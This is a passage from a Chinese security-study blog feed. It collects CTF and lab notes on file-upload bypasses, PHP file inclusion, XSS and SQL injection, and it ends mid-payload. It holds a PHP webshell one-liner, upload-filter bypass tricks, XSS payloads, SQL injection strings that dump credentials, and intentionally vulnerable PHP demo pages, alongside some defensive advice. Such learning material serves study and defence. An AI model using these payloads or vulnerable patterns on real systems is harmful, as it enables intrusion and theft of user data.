class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">JPEG (jpg)，             　文件头：FFD8FF　　　　　　　　　　　　　　</span><br><span class="line">PNG (png)，            　　 文件头：89504E47 文件尾：0000000049454E44AE426082</span><br><span class="line">GIF (gif)，              　　文件头：47494638</span><br><span class="line">ZIP Archive (zip)，           文件头：504B0304 文件尾：00000000</span><br><span class="line">TIFF (tif)，              　  文件头：49492A00</span><br><span class="line">Windows Bitmap (bmp)，      文件头：424D</span><br><span class="line">CAD (dwg)，               文件头：41433130</span><br><span class="line">Adobe Photoshop (psd)，      文件头：38425053</span><br><span class="line">Rich Text Format (rtf)，       文件头：7B5C727466</span><br><span class="line">XML (xml)，                文件头：3C3F786D6C</span><br><span class="line">HTML (html)，              文件头：68746D6C3E</span><br><span class="line">Email [thorough only] (eml)，   文件头：44656C69766572792D646174653A</span><br><span class="line">Outlook Express (dbx)，       文件头：CFAD12FEC5FD746F</span><br><span class="line">Outlook (pst)，             文件头：2142444E</span><br><span class="line">MS Word&#x2F;Excel (xls.or.doc)，    文件头：D0CF11E0</span><br><span class="line">MS Access (mdb)，           文件头：5374616E64617264204A</span><br><span class="line">WordPerfect (wpd)，          文件头：FF575043</span><br><span class="line">Adobe Acrobat (pdf)，        文件头：255044462D312E</span><br><span class="line">Quicken (qdf)，             文件头：AC9EBD8F</span><br><span class="line">Windows Password (pwl)，     文件头：E3828596</span><br><span class="line">RAR Archive (rar)，           文件头：52617221</span><br><span class="line">Wave (wav)，               文件头：57415645</span><br><span class="line">AVI (avi)，                 文件头：41564920</span><br><span class="line">Real Audio (ram)，           文件头：2E7261FD</span><br><span class="line">Real Media (rm)，            文件头：2E524D46</span><br><span class="line">MPEG (mpg)，              文件头：000001BA</span><br><span class="line">MPEG (mpg)，              文件头：000001B3</span><br><span class="line">Quicktime (mov)，           文件头：6D6F6F76</span><br><span class="line">Windows Media (asf)，        文件头：3026B2758E66CF11</span><br><span class="line">MIDI (mid)，                文件头：4D546864</span><br></pre></td></tr></table></figure><h3 id="部分MIME表"><a href="#部分MIME表" class="headerlink" title="部分MIME表"></a>部分MIME表</h3><table><thead><tr><th><code>.aac</code></th><th align="center">AAC audio</th><th><code>audio/aac</code></th></tr></thead><tbody><tr><td><code>.abw</code></td><td align="center"><a href="https://en.wikipedia.org/wiki/AbiWord" target="_blank" rel="noopener">AbiWord</a> document</td><td><code>application/x-abiword</code></td></tr><tr><td><code>.arc</code></td><td align="center">Archive document (multiple files embedded)</td><td><code>application/x-freearc</code></td></tr><tr><td><code>.avi</code></td><td align="center">AVI: Audio Video Interleave</td><td><code>video/x-msvideo</code></td></tr><tr><td><code>.azw</code></td><td align="center">Amazon Kindle eBook format</td><td><code>application/vnd.amazon.ebook</code></td></tr><tr><td><code>.bin</code></td><td align="center">Any kind of binary data</td><td><code>application/octet-stream</code></td></tr><tr><td><code>.bmp</code></td><td align="center">Windows OS/2 Bitmap Graphics</td><td><code>image/bmp</code></td></tr><tr><td><code>.bz</code></td><td align="center">BZip archive</td><td><code>application/x-bzip</code></td></tr><tr><td><code>.bz2</code></td><td align="center">BZip2 archive</td><td><code>application/x-bzip2</code></td></tr><tr><td><code>.csh</code></td><td align="center">C-Shell script</td><td><code>application/x-csh</code></td></tr><tr><td><code>.css</code></td><td align="center">Cascading Style Sheets (CSS)</td><td><code>text/css</code></td></tr><tr><td><code>.csv</code></td><td align="center">Comma-separated values (CSV)</td><td><code>text/csv</code></td></tr><tr><td><code>.doc</code></td><td align="center">Microsoft Word</td><td><code>application/msword</code></td></tr><tr><td><code>.docx</code></td><td align="center">Microsoft Word (OpenXML)</td><td><code>application/vnd.openxmlformats-officedocument.wordprocessingml.document</code></td></tr><tr><td><code>.gif</code></td><td align="center">Graphics Interchange Format (GIF)</td><td><code>image/gif</code></td></tr><tr><td><code>.htm.html</code></td><td align="center">HyperText Markup Language (HTML)</td><td><code>text/html</code></td></tr><tr><td><code>.jpeg</code> <code>.jpg</code></td><td align="center">JPEG images</td><td><code>image/jpeg</code></td></tr><tr><td><code>.js</code></td><td align="center">JavaScript</td><td><code>text/javascript</code></td></tr><tr><td><code>.json</code></td><td align="center">JSON format</td><td><code>application/json</code></td></tr><tr><td><code>.mp3</code></td><td align="center">MP3 audio</td><td><code>audio/mpeg</code></td></tr><tr><td><code>.png</code></td><td align="center">Portable Network Graphics</td><td><code>image/png</code></td></tr><tr><td><code>.pdf</code></td><td align="center">Adobe <a href="https://acrobat.adobe.com/us/en/why-adobe/about-adobe-pdf.html" target="_blank" rel="noopener">Portable Document Format</a> (PDF)</td><td><code>application/pdf</code></td></tr><tr><td><code>.ppt</code></td><td align="center">Microsoft PowerPoint</td><td><code>application/vnd.ms-powerpoint</code></td></tr><tr><td><code>.sh</code></td><td align="center">Bourne shell script</td><td><code>application/x-sh</code></td></tr><tr><td><code>.svg</code></td><td align="center">Scalable Vector Graphics (SVG)</td><td><code>image/svg+xml</code></td></tr><tr><td><code>tif.tiff</code></td><td align="center">Tagged Image File Format (TIFF)</td><td><code>image/tiff</code></td></tr><tr><td><code>.txt</code></td><td align="center">Text, (generally ASCII or ISO 8859-<em>n</em>)</td><td><code>text/plain</code></td></tr><tr><td><code>.xml</code></td><td align="center"><code>XML</code></td><td><code>application/xml</code> 代码对普通用户来说不可读 (<a href="https://tools.ietf.org/html/rfc3023#section-3" target="_blank" rel="noopener">RFC 3023</a>, section 3) <code>text/xml</code> 代码对普通用户来说可读 (<a href="https://tools.ietf.org/html/rfc3023#section-3" target="_blank" rel="noopener">RFC 3023</a>, section 3)</td></tr></tbody></table><h4 id="后记：百度杯upload"><a href="#后记：百度杯upload" class="headerlink" title="后记：百度杯upload"></a>后记：百度杯upload</h4><p>为何可以直接上传后缀为 pht 或 phtml 绕过黑名单呢？</p><p>php的conf文件中是有一个正则的后缀名限制的，只要符合都可以被当做php文件执行。</p><p>符合的后缀包括 php、php3、php4、php5、phtml、pht 等。</p><p>什么环境下可以解析 phtml 和 pht 呢？</p><p>1，phpstudy和wamp以及centos用yum方式 安装的lamp环境不能解析phtml和pht</p><p>2，ubuntu和debian利用apt-get方式安装的lamp环境 就能解析phtml和pht</p><p>利用这些环境特性和黑名单就能绕过限制，达到上传webshell的目的。</p><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h4 id="php文件包含的形式"><a href="#php文件包含的形式" class="headerlink" title="php文件包含的形式"></a>php文件包含的形式</h4><p>&lt;?php<br>    $file = $_GET[‘file’];<br>    if(isset($file)){<br>    include(“$file”);<br>    //require();<br>    //require_once();<br>    //include_once();<br>    }else{<br>        echo “file fail”<br>    }</p><h4 id="php中引发文件包含就漏洞的通常是以下四个函数："><a href="#php中引发文件包含就漏洞的通常是以下四个函数：" class="headerlink" title="php中引发文件包含就漏洞的通常是以下四个函数："></a>php中引发文件包含就漏洞的通常是以下四个函数：</h4><p>include()<br>include_once()<br>require()<br>require_once()<br>注：require()如果在包含过程中出错，比如文件不存在等，会直接退出不执行后续语句.<br>include()如果出错会提出警告，后续语句会继续执行<br>文件包含漏洞的场景:<br>1.具有相关的文件包含函数<br>2.文件包含函数中存在动态变量，比如include $file;.<br>3.攻击者能够控制该变量,比如$file = $_GET[‘file’];.</p><h4 id="分类"><a href="#分类" class="headerlink" title="分类:"></a>分类:</h4><p>1.LFI(Local File Inclusion)<br>本地文件包含漏洞，指能打开并包含本地文件的漏洞，大部分情况下遇到的都是本地包含。<br>2.RFI(Remote File Inclusion)<br>远程文件包含漏洞，只能够包含远程服务器上的文件并执行，由于远程文件包含漏洞是我们可控的<br>，因此漏洞一旦存在危害就很大利用条件较为苛刻，需要PHP.INI中进行配置<br>1.allow_url_fopen = On<br>2.allow_url_include = On</p><h3 id="做题过程遇到的补充"><a href="#做题过程遇到的补充" class="headerlink" title="做题过程遇到的补充:"></a>做题过程遇到的补充:</h3><p>可以爆出当前目录下的所有文件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">php</span>&gt;</span><span class="actionscript">system(<span class="string">"ls"</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>allow_url_include为On，用<a href="php://input">php://input</a>伪协议进行包含</p><p>php://filter/read=convert.base64-encode/recource=index.php;</p><p>这句话的意思是我们用base64编码的方式来读文件index.php；</p><p>若后台代码过滤了&lt;?和php关键字可以用大小写绕过php关键字，用HTML绕过&lt;?</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"pHp"</span>&gt;</span><span class="javascript">@<span class="built_in">eval</span>($_POST[<span class="string">'sb'</span>])</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>重新根据upload-labs-master做的整理：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1.允许.jpg|.png|.gif</span><br><span class="line">绕过方法：禁用js，或者添加|.php允许马上传，或者上传jpg文件再抓包修改后缀为.php</span><br><span class="line">2.只对content-type进行处理，可以修改为图片的格式image&#x2F;jpeg、image&#x2F;png、image&#x2F;gif</span><br><span class="line">3.用黑名单不允许上传.asp,.aspx,.php,.jsp后缀的文件</span><br><span class="line">但可以上传.phtml .phps .php5 .pht</span><br><span class="line">4.黑名单过滤除了.htaccess所有的后缀名，先上传.htaccess，再上传jpg马</span><br><span class="line">5.大小写未过滤，可以用大小写绕过WAF</span><br><span class="line">6.未对后缀名进行去空，可以加空格绕过</span><br><span class="line">7.未对点绕过，可以用1.php.来绕过，利用windows特性，会自动去掉后缀名中最后的”.”</span><br><span class="line">8.没有对后缀名中的’::$DATA’进行过滤，可以在后缀名加::$DATA绕过文件名+&quot;::$DATA&quot;会把::$DATA之后的数据当成文件流处理,不会检测后缀名</span><br><span class="line">9.利用1.php. .（点+空格+点）来绕过</span><br><span class="line">10. $file_name &#x3D; str_ireplace($deny_ext,&quot;&quot;, $file_name);黑名单过滤将后缀名替换为空，双写可以绕过</span><br><span class="line">11.白名单判断$img_path &#x3D; $_GET[&#39;save_path&#39;].&quot;&#x2F;&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;直接拼接，可以用%00绕过</span><br><span class="line">12.save_path参数通过POST方式传递，还是利用00截断，因为POST不会像GET对%00进行自动解码，所以需要在二进制中进行修改</span><br><span class="line">13.getimagesize函数判断文件类型，php_exif模块来判断文件类型，通过读文件的前2个字节判断文件类型，都可以用图片马的方式绕过</span><br><span class="line">14.二次渲染绕过</span><br><span class="line">15.条件竞争，先将文件上传到服务器，然后判断文件后缀是否在白名单里，如果在则重命名，否则删除，因此我们可以上传1.php只需要在它删除之前访问即可，可以利用burp的intruder模块不断上传，然后我们不断的访问刷新该地址即可，有move和renameFile函数的可以通过不断上传图片马，由于条件竞争可能来不及重命名，从而上传成功。</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;一句话木马&quot;&gt;&lt;a href=&quot;#一句话木马&quot; class=&quot;headerlink&quot; title=&quot;一句话木马&quot;&gt;&lt;/a&gt;一句话木马&lt;/h4&gt;
    
    </summary>
    
    
    
      <category term="文件上传" scheme="http://yoursite.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>Xss</title>
    <link href="http://yoursite.com/2020/01/14/Xss/"/>
    <id>http://yoursite.com/2020/01/14/Xss/</id>
    <published>2020-01-14T01:52:36.000Z</published>
    <updated>2020-03-12T08:39:17.546Z</updated>
    
    <content type="html"><![CDATA[<h4 id="1-Xss漏洞简介"><a href="#1-Xss漏洞简介" class="headerlink" title="1.Xss漏洞简介"></a>1.Xss漏洞简介</h4><a id="more"></a><p>跨站脚本攻击是指恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。<br> xss漏洞通常是通过php的输出函数将javascript代码输出到html页面中，通过用户本地浏览器执行的，所以xss漏洞关键就是<strong>寻找参数未过滤的输出函数</strong>。<br> 常见的输出函数有： <code>echo printf print print_r sprintf die var-dump var_export</code>.</p><h4 id="2-Xss分类"><a href="#2-Xss分类" class="headerlink" title="2.Xss分类"></a>2.Xss分类</h4><p>反射型XSS：恶意攻击者通过往web页面中插入恶意html代码，当用户访问该网页时该代码会被触发执行，从而达到攻击用户的目的。</p><p>存储型XSS：攻击数据被写入了数据库中，每当有用户访问该页面的时候都会触发代码执行，这种XSS非常危险，容易造成蠕虫，大量盗窃cookie。</p><p>DOM型XSS：严格意义上应该归属到反射型XSS，并没有恶意代码存储到数据库内。DOMXSS基于文档对象模型，像一些用户可以操纵的，如url、location、refelter,脚本程序可以通过DOM动态检查和修改页面内容。</p><h4 id="3-1反射型XSS"><a href="#3-1反射型XSS" class="headerlink" title="3.1反射型XSS"></a>3.1反射型XSS</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt; </span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt; </span><br><span class="line">&lt;title&gt;XSS&lt;&#x2F;title&gt; </span><br><span class="line">&lt;&#x2F;head&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line">&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;get&quot;&gt; </span><br><span class="line">&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;input&quot;&gt;     </span><br><span class="line">&lt;input type&#x3D;&quot;submit&quot;&gt; </span><br><span class="line">&lt;&#x2F;form&gt; </span><br><span class="line">&lt;br&gt; </span><br><span class="line">&lt;?php </span><br><span class="line">$XssReflex &#x3D; $_GET[&#39;input&#39;];</span><br><span class="line">echo &#39;output:&lt;br&gt;&#39;.$XssReflex;</span><br><span class="line">?&gt; </span><br><span class="line">&lt;&#x2F;body&gt; </span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>在谷歌浏览器中输入localhost/Xsstest.php,会进入页面，输入1时点提交会出现这样的页面</p><img src="/2020/01/14/Xss/1.png" class="" title="examplename"><p>这是正常的页面，但是当我们输入</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">'XSS'</span>)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>页面就会有弹窗出现,说明输入的js代码被成功执行了</p><img src="/2020/01/14/Xss/2.png" class="" title="examplename"><p>接下来我们看一下网页源代码，会发现多出了一行</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">'xss'</span>)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><img src="/2020/01/14/Xss/3.png" class="" title="examplename"><p>通过这个弹窗知道js代码可被执行，当我们输入一些其他函数，比如<code>document.cookie</code>就可以成功盗取用户的cookie信息，或者读取用户浏览器信息。</p><p>3.2存储型XSS</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;span style&#x3D;&quot;font-size:18px;&quot;&gt;&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&#x2F;&gt;  </span><br><span class="line">&lt;html&gt;  </span><br><span class="line">&lt;head&gt;  </span><br><span class="line">&lt;title&gt;XssStorage&lt;&#x2F;title&gt;  </span><br><span class="line">&lt;&#x2F;head&gt;  </span><br><span class="line">&lt;body&gt;  </span><br><span class="line">&lt;h2&gt;Message Board&lt;h2&gt;  </span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;XssStorage.php&quot; method&#x3D;&quot;post&quot;&gt;  </span><br><span class="line">Message:&lt;textarea id&#x3D;&#39;Mid&#39; name&#x3D;&quot;desc&quot;&gt;&lt;&#x2F;textarea&gt;  </span><br><span class="line">&lt;br&gt;  </span><br><span class="line">&lt;br&gt;  </span><br><span class="line">Subuser:&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;user&quot;&#x2F;&gt;&lt;br&gt; </span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot; onclick&#x3D;&#39;loction&#x3D;&quot;XssStorage.php&quot;&#39;&#x2F;&gt;  </span><br><span class="line">&lt;&#x2F;form&gt;  </span><br><span class="line">&lt;?php  </span><br><span class="line">if(isset($_POST[&#39;user&#39;])&amp;&amp;isset($_POST[&#39;desc&#39;]))&#123;  </span><br><span class="line">$log&#x3D;fopen(&quot;sql.txt&quot;,&quot;a&quot;);  </span><br><span class="line">fwrite($log,$_POST[&#39;user&#39;].&quot;\r\n&quot;);  </span><br><span class="line">fwrite($log,$_POST[&#39;desc&#39;].&quot;\r\n&quot;);  </span><br><span class="line">fclose($log);  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">if(file_exists(&quot;sql.txt&quot;))  </span><br><span class="line">&#123;  </span><br><span class="line">$read&#x3D; fopen(&quot;sql.txt&quot;,&#39;r&#39;);  </span><br><span class="line">while(!feof($read))  </span><br><span class="line">&#123;  </span><br><span class="line">    echo fgets($read).&quot;&lt;&#x2F;br&gt;&quot;;  </span><br><span class="line">&#125;  </span><br><span class="line">fclose($read);  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;  </span><br><span class="line">&lt;&#x2F;body&gt;  </span><br><span class="line">&lt;&#x2F;html&gt;&lt;&#x2F;span&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这个页面采用POST提交数据，生成、读取文本模拟数据库，提交数据之后页面会将数据写入sql.txt，再打开页面时会读取sql.txt中内容并显示在网页上，实现了存储型xss攻击模拟。</span><br></pre></td></tr></table></figure><p>直接输入</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">'XSS'</span>)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>好了，下面是网页呈现的效果</p><img src="/2020/01/14/Xss/4.png" class="" title="examplename"><p>这个弹窗可能会被认为跟上面的一样，其实不一样，这句js代码被写入了数据库当中，也就是说你一直刷新这个代码会一直被执行</p><img src="/2020/01/14/Xss/5.png" class="" title="examplename"><p>这就是所谓的存储型XSS漏洞，一次提交之后，每当有用户访问这个页面都会受到XSS攻击，危害巨大。</p><p>php中xss的漏洞防范方法总结：&lt;参考自Segmentfault&gt;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">A.PHP直接输出html的，可以采用以下的方法进行过滤：</span><br><span class="line"></span><br><span class="line">    1.htmlspecialchars函数</span><br><span class="line">    2.htmlentities函数</span><br><span class="line">    3.HTMLPurifier.auto.php插件</span><br><span class="line">    4.RemoveXss函数</span><br><span class="line"></span><br><span class="line">B.PHP输出到JS代码中，或者开发Json API的，则需要前端在JS中进行过滤：</span><br><span class="line"></span><br><span class="line">    1.尽量使用innerText(IE)和textContent(Firefox),也就是jQuery的text()来输出文本内容</span><br><span class="line">    2.必须要用innerHTML等等函数，则需要做类似php的htmlspecialchars的过滤</span><br><span class="line"></span><br><span class="line">C.其它的通用的补充性防御手段</span><br><span class="line"></span><br><span class="line">    1.在输出html时，加上Content Security Policy的Http Header</span><br><span class="line">    （作用：可以防止页面被XSS攻击时，嵌入第三方的脚本文件等）</span><br><span class="line">    （缺陷：IE或低版本的浏览器可能不支持）</span><br><span class="line">    2.在设置Cookie时，加上HttpOnly参数</span><br><span class="line">    （作用：可以防止页面被XSS攻击时，Cookie信息被盗取，可兼容至IE6）</span><br><span class="line">    （缺陷：网站本身的JS代码也无法操作Cookie，而且作用有限，只能保证Cookie的安全）</span><br><span class="line">    3.在开发API时，检验请求的Referer参数</span><br><span class="line">    （作用：可以在一定程度上防止CSRF攻击）</span><br><span class="line">    （缺陷：IE或低版本的浏览器中，Referer参数可以被伪造）</span><br></pre></td></tr></table></figure><p>XSS-games略有心得</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1.无任何过滤&lt;script&gt;alert(1);&lt;&#x2F;script&gt;</span><br><span class="line">2.带有&lt;input&gt;标签，先闭合参数再进行XSS注入</span><br><span class="line">3.尖括号被解析，用onclick事件包含在&lt;&gt;内,onclick&#x3D;&#39;javascript:alert(1)&#39;</span><br><span class="line">4.onclick,script都被过滤,用href方法&lt;a href&#x3D;javasacript:alert(1)&gt;</span><br><span class="line">5.href script onclick 都被过滤了 可以尝试下大小写绕过</span><br><span class="line">6.对 on href script 进行了完全屏蔽,可以双写绕过，因为只过滤了一次</span><br><span class="line">7.给了一个链接，相当于一个标签注入，script被转义，双写大小写都不行，可以用HTML字符转换绕过，转成16进制或10进制</span><br><span class="line">8.需要http:&#x2F;&#x2F;,源码中要匹配</span><br><span class="line">9.user-agent、cookie、referer处都可能是注入点</span><br><span class="line">10.上传含有XSS代码的图片触发漏洞</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;1-Xss漏洞简介&quot;&gt;&lt;a href=&quot;#1-Xss漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;1.Xss漏洞简介&quot;&gt;&lt;/a&gt;1.Xss漏洞简介&lt;/h4&gt;
    
    </summary>
    
    
    
      <category term="Xss总结" scheme="http://yoursite.com/tags/Xss%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>sqli</title>
    <link href="http://yoursite.com/2020/01/13/sqli/"/>
    <id>http://yoursite.com/2020/01/13/sqli/</id>
    <published>2020-01-13T10:19:16.000Z</published>
    <updated>2020-03-11T08:16:54.000Z</updated>
    
    <content type="html"><![CDATA[<p>根据sqli-labs上的教学做了一个sql用法的总结</p><a id="more"></a><h4 id="1-union联合查询"><a href="#1-union联合查询" class="headerlink" title="1.union联合查询"></a>1.union联合查询</h4><p>union的作用是将两个sql语句进行联合</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?id=-1'union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(schema_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.schemata<span class="comment">#</span></span><br><span class="line">此时的<span class="keyword">sql</span>语句为<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="string">'-1'</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(schema_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.schemata<span class="comment">--+ LIMIT 0,1 </span></span><br><span class="line">接着下一步就是爆数据表</span><br><span class="line">?<span class="keyword">id</span>=<span class="number">-1</span><span class="string">'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = '</span><span class="keyword">security</span><span class="string">'#</span></span><br><span class="line"><span class="string">通过这一步可以得到表名，接着来爆出表的列</span></span><br><span class="line"><span class="string">?id=-1'</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name = <span class="string">'users'</span><span class="comment">#</span></span><br><span class="line">最后就是爆数据了，根据上一步可以看到这个表中有什么列值，根据需要来爆</span><br><span class="line">?<span class="keyword">id</span>=<span class="number">-1</span><span class="string">'union select 1,username,password from users where id = 2#</span></span><br></pre></td></tr></table></figure><p>根据注入时的提示，可以判断注入的形式，可能是?id=1’),?id=1”)。</p><h3 id="2-盲注-下面的都是能使用的payload展示"><a href="#2-盲注-下面的都是能使用的payload展示" class="headerlink" title="2.盲注:(下面的都是能使用的payload展示)"></a>2.盲注:(下面的都是能使用的payload展示)</h3><p>1’:基于布尔SQL盲注</p><p>2’:基于时间的SQL盲注</p><p>3’:基于报错的SQL盲注</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">布尔注入</span><br><span class="line">利用left(database(),1)</span><br><span class="line">?id=1'and <span class="keyword">select</span> <span class="keyword">left</span>(<span class="keyword">version</span>(),<span class="number">1</span>)=<span class="number">5</span><span class="comment">#可以查看版本号的首位字</span></span><br><span class="line">利用<span class="keyword">substr</span>(a,b,c),从第b位开始取出a中长度为c的子串</span><br><span class="line">?<span class="keyword">id</span>=<span class="number">1</span><span class="string">'and ascii(substr(select table_name from information_schema.tables where table_schema=database()limit0,1),1,1)=113#</span></span><br><span class="line"><span class="string">利用regexp正则匹配</span></span><br><span class="line"><span class="string">?id=1'</span><span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="keyword">and</span> column_name regexp <span class="string">'^userame'</span><span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)<span class="comment">#</span></span><br><span class="line">利用<span class="keyword">ord</span>()和<span class="keyword">mid</span></span><br><span class="line">?<span class="keyword">id</span>=<span class="number">1</span><span class="string">'and ord(mid(select ifnull(cast(username as char),0x20)from security.users order by id limit 0,1),1,1)=68#</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">报错注入</span><br><span class="line">?id=1'union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="number">0x3a</span>,<span class="number">0x3a</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x3a</span>,<span class="number">0x3a</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))a <span class="keyword">from</span> information_schema.columns <span class="keyword">group</span> <span class="keyword">by</span> a<span class="comment">--+</span></span><br><span class="line">利用<span class="built_in">bigint</span>溢出</span><br><span class="line">?<span class="keyword">id</span>=<span class="number">1</span><span class="string">'union select(!(select * from (select user())x)-~0),2,3#</span></span><br><span class="line"><span class="string">xpath函数报错注入</span></span><br><span class="line"><span class="string">?id=1;and 